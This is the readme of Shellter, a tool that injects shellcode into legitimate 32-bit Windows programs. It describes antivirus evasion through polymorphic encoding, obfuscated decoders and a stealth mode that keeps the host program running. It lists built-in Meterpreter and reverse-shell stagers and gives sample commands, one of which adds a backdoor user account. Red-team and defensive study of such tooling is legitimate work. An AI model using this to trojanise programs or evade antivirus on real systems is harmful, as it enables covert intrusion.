[1] What is it?  
================

Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can
be used in order to inject shellcode into native Windows applications
(currently 32-bit apps only). The shellcode can be something yours or something
generated through a framework, such as Metasploit.

Shellter takes advantage of the original structure of the PE file and doesn't
apply any  modification such as changing memory access permissions in sections
(unless the user wants to), adding an extra section with RWE access, and
whatever would look dodgy under an AV scan.

Shellter is not just an EPO infector that tries to find a location to insert an
instruction to redirect execution to the payload. Unlike any other infector,
Shellter’s advanced infection engine never transfers the execution flow to a
code cave or to an added section in the infected PE file.


[2] How does it work?
======================

Shellter uses a unique dynamic approach which is based on the execution flow of
the target application. This means that no static/predefined locations are used
for shellcode injection. Shellter will launch and trace the target, while at
the same time will log the execution flow of the application.


[3] What does it trace?
========================

Shellter traces the entire execution flow that occurs in userland. 
That means, code inside the target application itself (PE image), and code
outside of it that might be in a system dll or on a heap, etc...
This happens in order to ensure that functions actually belonging to the target
executable, but are only used as callback functions for Windows APIs will not
be missed.

During tracing, Shellter will not log or count any instructions that are not in
the memory range of the PE image of the target application, since these cannot
be used as a reference to permanently inject the shellcode.


[4] Why do I need Shellter?
============================

Bypass AVs.

Executables created through Metasploit, or other penetration testing frameworks, 
are most likely detected by most AV vendors.
By using Shellter, you automatically have an infinitely polymorphic
executable template, since you can use any 32-bit 'standalone' native Windows
executable to host your shellcode. By 'standalone' means an executable that is
not statically linked to any proprietary DLLs, apart from those included by
default in Windows.

You can also use applications that make use of proprietary DLLs if those are
not required to create the process in the first place, and are normally loaded
later on if needed to execute code for a specific task. In case you select an
application that needs one or more proprietary DLLs to create the process in
the first place then you will have to include them in the same directory from
where you load the main executable. However, this is not recommended since it
is more convenient to have just a single executable to upload to the target.


[5] What types of applications can I use? 
==========================================

You can basically use any 32-bit standalone (see above) native Windows
application. Of course, since the main goal is to bypass an AV, you should
always avoid packed applications or generally applications that have 'dodgy'
characteristics such as sections with RWE permissions, more than one sections
containing executable code etc..

Another reason why you should avoid packed applications is because advanced
packers will also check for modifications of the file, so you will probably
just break it. Advanced packers also perform various anti-reversing tricks
which will detect Shellter's debugging engine during tracing. If you are a
lover of packers, you can first perform the injection and then pack the
application with the packer of your choice.

The best bet is to use completely legitimate looking applications (ideally not
packed) that are not flagged by any AV vendor for any reason. 

These can be either yours, or something you got online.


[6] Can I use encoded/self-decrypting payloads?
================================================

Shellter also supports encoded/self-decrypting payloads by taking advantage of
the Imports Table of the application. It will look for specific imported APIs
that can be used on runtime to execute a self-decrypting payload without doing
any modifications in the section's characteristics from inside the PE Header.
These handlers can also by dynamically obfuscated (see [11]).

At the moment 8 methods are supported for loading encoded payloads:

0. VirtualAlloc
1. VirtualAllocEx
2. VirtualProtect
3. VirtualProtectEx
4. HeapCreate/HeapAlloc
5. LoadLibrary/GetProcAddress
6. GetModuleHandle/GetProcAddress
7. CreateFileMapping/MapViewOfFile

If the target PE file doesn't import by default the necessary API(s) then 
a method wil be shown as 'N/A'.
If a method requires more than one APIs, like for example method 4,
it will also be shown as 'N/A' if the PE file doesn't import all the
necessary ones.

If none of the IAT handler methods supported are available for the current PE
target, Shellter will change the section's characteristics from inside the
PE Header.

This last option has been added in order to provide more flexibility to the
user in case he still wants to use a specific encoded payload along with the
same PE file.

When operating in Auto Mode, without command line arguments, Shellter will
automatically try to find all available methods and will use one at random.

If, the user has chosen to use these methods through the command line, but
the PE target doesn't support any of them, then Shellter will notify the user
and will automatically switch to section's characteristics modification.

It is recommended to always use encoded payloads, because some AV vendors
can easily pick up some common patterns in the shellcode generated by
metapsloit.


[7] Does Shellter provide any type of encoding?
=================================================

Shellter v4.0 introduced its own proprietary dynamic encoder.

The encoding engine will apply a random amount of XOR, ADD, SUB, NOT
operations and it will generate the decoder every time based on the chosen
operations. The sequence of those operations is also randomly chosen.

Usage of registers in the generated decoder is also randomised in order to
provide a more dynamic output.

The decoder can also be obfuscated by setting the --polydecoder switch in
command line.

When using the Auto mode without command line arguments, Shellter will apply
its own encoding and will obfuscate the decoder by default.

This feature can be used either with non-encoded payloads and with already
encoded ones as an extra layer of encoding.


Shellter v5.4 introduced the 'User Defined Encoding Sequence' feature which
enables the user to optionally define his own encoding sequence instead of
allowing Shellter to generate it.

Supported Encoding Operators:

XOR --> x
ADD --> +
SUB --> -
NOT --> !

Example #1: x!+x

When the encoding sequence is defined from the command line, the operators need
to be enclosed between '{}'.

Example #2: --encode {x!+}

In Manual mode you must not include the '{}' characters, just as in the first
example shown above.

This feature should only be used by advanced users that actually know what they
are doing. 
If you can't figure out why the {xx+-} encoding sequence is a bad idea, then
avoid messing up with this feature at all costs!

In Shellter v5.6 an extra check has been added over the encoding sequence defined
by the user in order to protect this feature from mistakes as the one mentioned
above.

However, keep in mind that erroneously using this feature, will cost you some extra
AV detections.


Remarks: 

The number of operators defined, must be between a minimum of 1 and a maximum of
12 operators.

If you just use the --encode switch without defining a custom sequence of encoding
operations, or if you use Auto mode without command line arguments, Shellter will
randomly create and apply an encoding scheme by itself.
This is recommended for most users.

If you enable stealth mode using --stealh/-s switches, then the --encode switch is
implied, but if you want to use a custom encoding scheme of your choice then you
need to explicitly use the --encode switch as shown in Example #2.


[8] What does 'Dynamic Thread Context Keys' mean?
===================================================

This feature was introduced in Shellter v4.0 and automates the usage
of dynamic thread context information from the original execution flow of
the target application, as encoding keys.

It will log the values of specific CPU registers on tracing and then will
filter that data for those injection locations where at least one of the
logged CPU registers has a value that can be reliably used for payload
encoding and decoding or runtime.

This is an experimental feature that eliminates the need of hardcoding the
decoding key.

In Auto mode, this feature can only be enabled from the command line by using
the --DTCK switch.

When this feature is used, a 3rd filtering stage is triggered which reduces even
more the available injection locations based on the logged execution flow.
For this reason, it is recommended to avoid enabling all other obfuscation features
in conjunction with this one, because this might cause either no available injection
locations due to the increaded size of the code to be injected, or very few of them.

Choosing just to obfuscate the IAT handlers using the '--polyiat' switch should be
fine. This is of course application specific, so you are always welcome to experiment
on your own.


[9] Does Shellter provide any ready to use payloads?
======================================================

Shellter v4.0 introduces a few embedded stager-payloads that are commonly used during
security testing engagements.

You can inject these payloads directly from Shellter, so you don't need to
generate them anymore through metasploit.

However, it is recommended that you encode them using the --encode flag in case
you use the Auto mode with command line arguments or enable that option when you are
asked,if you use the manual mode.

If the Auto mode is used without command line arguments, then Shellter will always
apply its own encoding by default.

 Payloads List
 -------------
[1] meterpreter_reverse_tcp
[2] meterpreter_reverse_http
[3] meterpreter_reverse_https
[4] meterpreter_bind_tcp
[5] shell_reverse_tcp
[6] shell_bind_tcp
[7] WinExec
	
Examples: -p meterpreter_reverse_tcp --lhost 192.168.0.6 --port 5656
	  -p winexec --cmd "cmd.exe /c net user evil password /ADD"

To use the above examples in Stealth Mode (see below), then just add '--stealth'
or '-s' arguments.

Reverse http/https payloads also accept domain names as --lhost parameter.
	  
	  
[10] What is the Stealth Mode?
===============================

This feature was introduced in Shellter V (v5.0).

It combines the benefits of dynamic PE infection with RedTeam functionality.

In a few words, this feature preserves the original functionality of the
infected application without compromising the originality of Shellter in terms
of dynamically choosing injection locations based on the execution flow of the
target PE file.

Furthermore, this feature allows to infect the same binary with more than one
payloads. 
As long as you enable the Stealth Mode feature, you can re-infect the same
binary with more payloads of your choice.
In this way, you can have multiple payloads running while the application still
runs as intended.

For example, you can infect the same PE file with a meterpreter_reverse_tcp
stager, a meterpreter_reverse_https stager and an another custom payload of
your choice.

All of them will run independently.

***Important***: 
When you use Stealth Mode with custom payloads, you need to remember to set the
exit function to 'THREAD' in your multi-handler listener, otherwise if the
session dies or you decide to kill it, then the process will terminate as well.
      
Also keep in mind that this exit function type is only effective after the
connection has been stablished, since this is handled by another stage of the
payload.

Furthermore, the reverse connection payloads from metasploit by default will
only attempt to connect back to the remote host only for a specific number of
times, and if that fails then the payload kills the process.

In order to keep the same behaviour regarding the amount of connection
attempts, and avoid to kill the process in Stealth Mode, Shellter will do a
small modification to them so that they will only kill the thread in which
the payload is running on, if there are no connection attempts left.

For all the reasons mentioned above, it is recommended that when you enable
Stealth Mode, and you want to use reverse connection payloads, to use those
embedded in Shellter.

Other payloads, like the command-execution ones, are not affected by this
issue, since the exit function type is actually effective on the generated
payload itself when you set it in metasploit before generating the raw
payload.


[11] What is Thread Context Aware polymorphic code?
====================================================

This feature was introduced in Shellter v3.0 in order to enhance polymorphism
in the final output.
Shellter will break down a given algorithm or code block and will mix its
effective instructions with dynamically generated polymorphic code that does
not interfere with the logic of the original algorithm.


[12] What is Reflective DLL loading?
=====================================

Shellter v4.0 introduced support for Reflective DLL loading.

This means that you can inject a proper PE built as DLL, that contains a
reflective DLL loader function.

This function loads the DLL in the address space of the calling process without
touching the disk.

In Manual mode you will be prompted to enter the required information for this
feature.

If you want to use this feature in Auto mode, then you need to use command line
arguments.

Specifying --reflective <functionName> tells to Shellter that the submitted
payload must be handled accordingly. The function name is important as this
refers to the exported reflective loader function name.

Shellter needs this information to know where to redirect the execution so
that the reflective loader can take over the loading process when the time comes.


[13] What about self-modifying code?
=====================================

Shellter is capable of recognizing self-modifying code and exclude those
locations from the available locations for shellcode injection, based on the
execution flow previously logged.

This is important in order to avoid injecting your shellcode into a location
where the code gets modified on runtime, which will break your shellcode.
Shellter will always perform these checks during the filtering stage either if
you choose to check for self-modifying code on runtime or not.

There is only one exception where the self-modifying code detection during
filtering might fail. This is in case the modified code, is changed back to its
original state before filtering the execution flow logs.

In order to avoid this issue, you can configure Shellter to notify you during
tracing immediately after stepping over the first instruction being part of
self-modifying code. You can then stop the tracing and use the already logged
execution flow path.

However, as already mentioned if you use legitimate and not packed applications
, which is what you should use Shellter with, you will hardly find any cases of
self-modifying code, but even if you do Shellter can handle this for you quite
well either during tracing or later during the filtering stages.


[14] What about relocations?
=============================

Shellter, will disable dynamic ImageBase in the target executable in order to
avoid breaking your shellcode in case you inject it in an area where fixups
would normally occur during process loading.

I might add a more sophisticated support for relocations in the future.


[15] What about Multi-Thread Applications?
===========================================

Shellter is capable of keeping track of all the new threads created and trace
the executed instructions.
Tracing all the threads is optional, and must be activated by the user in
manual mode, but it is enabled by default in Auto mode from version 4.0.

Shellter will always notify the user when a new thread has been created, or
terminated.

From version 5.3, if the user chooses to only trace the main thread, or log
dynamic thread context information to later use Dynamic Thread Context Keys,
Shellter will exit the tracing stage once a new thread is created in order
to provide more accurate execution flow filtering results and more reliable
injection locations.


[16] what about Anti-Reversing tricks?
=======================================

-When running Shellter under Wine this feature is disabled for compatibility
reasons.-

Usually non-packed applications don't implement anti-reversing or
anti-debugging tricks.

However, Shellter is able to eliminate some basic debugging artifacts.

Currently Shellter clears the following PEB members:

PEB.IsBeingDebugged
PEB.NtGlobalFlag

Even though tracing code that implements such tricks is not what Shellter
was built for, I might add support for more of them in the future.


[17] What if the target process dies during tracing?
=====================================================

Shellter will notify you about this and will give you the option to use the
already logged execution flow. In fact, you can kill the target process from
task manager, without affecting Shellter.


[18] What if an internal engine related error occurs?
======================================================

Shellter will notify you about this, by displaying a proprietary error message
and a Windows related error code.
Shellter will still give you the option of using the already logged execution
flow.
You can choose to notify the author about this.


[19] How do execution flow filters work?
=========================================

Once tracing has finished, or stopped by the user or for any other reason,
Shellter will trigger the 1st stage filtering. During this stage all
unnecessary logs will be eliminated in order to enhance the 2nd stage filtering
that performs more complex checks over the logged execution flow.

The 2nd stage filtering takes in consideration various parameters such as the
size of the polymorphic code added, the size of the actual payload, the
execution flow, etc...

An additional, 3rd filtering stage was introduced in Shellter v4.0 and it
is triggered when the user enables the 'Dynamic Thread Context Keys' feature
(see [8]).


[20] How much time does it need for tracing and log filtering?
===============================================================

Tracing time depends of the amount of instructions that the user wants to
trace, and of course the code complexity, and the power of the CPU.

Generally, code that makes frequent Calls to Windows APIs that need to jump into Kernel
back, will inevitably need more time to trace than code that doesn't.

Shellter will also treat instructions with REP prefixes differently than
others, in order to avoid keep stepping on them until ECX == 0. This is done in
order to enhance tracing speed on code that makes frequent use of those
instructions,and of course in order to avoid filling the tracing logs with
unnecessary duplicates that would be removed anyway later during the filtering
stage.

Finally, choosing to visually see the code running live during tracing, will
also slow down the engine since it will be required to disassemble and print
every instruction (see 'm' option in next section).
 
It's not a bug, it's a feature! :^P

Filtering speed also depends on the CPU capabilities and the complexity of the
code.


[21] What options does Shellter provide? 
=========================================

Read the Version_History.txt for more information about the most recent
changes.

Shellter will select automatically the compatible tracing engine, whether you
run it in a native Windows host or in Wine/Crossover.

Shellter offers two main modes of operation as described below.


Auto Mode:
-----------

Auto Mode supports command line. Run Shellter with -h argument to see more
information about it.

If command line is not used, the following options must be set individually by
the user:


a) Select target executable.

b) Choose to enable Stealh Mode.

c) Payload details.


When operating in Auto mode, Shellter will trace a random number of
instructions for a maximum time of approximately 30 seconds in native Windows,
and for 60 seconds inside Wine.


If Auto mode is used without command line, the following features/options are
automatically set as follows:

i) Traces all threads in the target.

ii) Handles all payloads as encoded.

iii) Automates usage of encoded-payload handlers (section 6).

iv) Encodes the payload using Shellter's proprietary polymorphic encoder.

v) Obfuscates the generated decoder.

vi) Obfuscates the chosen IAT handler.

vii) Generates and binds junk polymorphic code.

viii) Doesn't show real-time tracing. 


Manual Mode:
-------------

a) Choose target executable. This will host your shellcode.

b) Choose if you want to gather thread context information or not. 

c) Choose number of instructions to trace. 

d) Choose to detect self-modifying code on tracing.
    d.1) If option 'd' is enabled you can choose to pause tracing if 
         self-modifying code is detected.  
    d.2) If option 'd.1' is enabled you can choose to stop tracing if
         self-modifying code is detected.

e) Trace just the main or all of the threads if more than one are created
   during tracing. This option is disabled if user enables option 'b'.

f) Show real time tracing.

g) Choose to enable Stealth Mode 

h) Select Payload from the list or a custom.

i) Choose to encode the payload using Shellter's encoder.

j) Choose to specify a User Defined Encoding Sequence.

k) Choose to encode the payload using DTCK if option 'b' was enabled.

l) Choose to obfuscate the generated decoder.

m) Enable encoded payload handling or not.

   l.1) Choose between IAT Handlers or Section's Characteristics
	modification.

   l.2) If IAT Handlers are used (see [6]), the user can also choose to
        bind them with extra polymorphic code (see [11]).

n) Choose User/Engine Polymorphic code.

    n.1) If the user creates his own polycode and option 'b' was enabled, he
         can take advantage of the logged thread context information.
         This feature is currently available only in Manual mode.

o) Show Disassembled Entries.

p) Select address to inject your shellcode.


[22] What is the purpose of the verification stage?
====================================================

Once injection has been completed successfully, Shellter will run the target
PE in order to verify that the execution flow will reach indeed the first
instruction of the injected code.

If polymorphic code and/or a decoder generated by Shellter have been used,
then this refers to those and not to the first instruction of the effective
payload.

This test will run for a maximum time of 10 seconds.

If user interaction is required in order for the execution flow to reach
that instruction, then this test will not be able to perform the verification
unless you perform the necessary interaction with the application.

However, this does not mean that the injection process has failed.

So, in any case you should always verify the infected executable before it is
used.


[23] System Requirements 
=========================

It is recommended that you use Windows XP SP3 (32/64-bit) and above.

* CPU: The better the faster. It's only a matter of time and processing speed.

* RAM:
    Tracing 1 million instructions without Thread Context logging  => ~ 6 MBs
    Tracing 1 million instructions with Thread Context logging => ~ 28 MBs
    Tracing 10 million instructions without Thread Context logging => ~ 40 MBs
    Tracing 10 million instructions with Thread Context logging => ~ 270 MBs
